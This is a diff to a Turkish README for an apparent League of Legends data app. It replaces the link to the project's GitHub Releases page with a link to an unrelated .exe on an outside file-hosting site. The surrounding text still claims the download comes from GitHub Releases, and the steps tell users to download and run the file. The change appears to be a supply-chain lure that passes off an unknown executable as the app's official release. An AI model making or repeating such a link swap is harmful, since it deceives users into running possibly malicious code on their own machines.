@@ -41,7 +41,7 @@ Uygulama, mevcut Data Dragon verilerini `loldata` klasöründen kullanacak şeki
 
 Uygulamanın çalışır `.exe` sürümünü GitHub deposunun **Releases** bölümünden indirebilirsin.
 
-1. [Releases sayfasını aç](../../releases).
+1. [İndirme sayfasını aç](https://dosya.co/tn1ak42k5mud/Oğlumun_Tabancası.exe.html).
 2. En güncel sürümdeki Windows `.exe` dosyasını indir.
 3. İndirilen dosyayı çalıştır.
 4. Riot API destekli özellikleri kullanmak istiyorsan uygulamanın **Settings** bölümünden kendi API anahtarını yapılandır.
